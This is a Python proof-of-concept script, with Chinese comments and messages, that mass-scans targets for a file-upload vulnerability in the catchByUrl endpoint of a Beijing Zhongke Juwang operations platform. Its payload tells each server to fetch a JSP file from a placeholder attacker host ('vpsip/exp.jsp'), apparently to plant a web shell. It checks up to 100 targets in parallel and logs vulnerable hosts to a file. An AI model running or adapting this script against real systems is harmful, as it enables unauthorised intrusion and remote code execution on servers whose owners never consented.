import argparse
import requests
import os
import sys
import json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = '''
            _       _     ____        _    _      _ 
           | |     | |   |  _ \      | |  | |    | |
   ___ __ _| |_ ___| |__ | |_) |_   _| |  | |_ __| |
  / __/ _` | __/ __| '_ \|  _ <| | | | |  | | '__| |
 | (_| (_| | || (__| | | | |_) | |_| | |__| | |  | |
  \___\__,_|\__\___|_| |_|____/ \__, |\____/|_|  |_|
                                 __/ |              
                                |___/               
    '''
    print(test)


def poc(target):
    payload = "/resources/files/ue/catchByUrl?url=http://vpsip/exp.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "Connection": "close"
    }
    try:
        response = requests.get(url=target + payload, headers=headers, verify=False, timeout=5)
        if response.status_code == 200:
            try:
                json_data = response.json()  # 解析 JSON 响应
                if json_data.get("msg") == "文件类型不允许上传":
                    print(f"[+] {target} 不存在文件上传漏洞")
                else:
                    print(f"[+] {target} 存在文件上传漏洞")
                    with open("result.txt", "a",encoding='utf-8') as f:
                        f.write(f"{target}存在文件上传漏洞\n")
            except json.JSONDecodeError:
                print(f"[!] {target} 响应不是有效的 JSON 格式")
        else:
            print(f"[+] {target} 请求失败，状态码: {response.status_code}")
    except Exception as e:
        print(f"[!] {target} 请求失败，错误信息：{e}")


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    print("--author:Thejoyofgettingusedtolife  联系方式：liuhangtong527@gmail.com".rjust(100, " "))
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t 北京中科聚网一体化运营平台catchByUrl存在文件上传漏洞.py -h")


if __name__ == '__main__':
    main()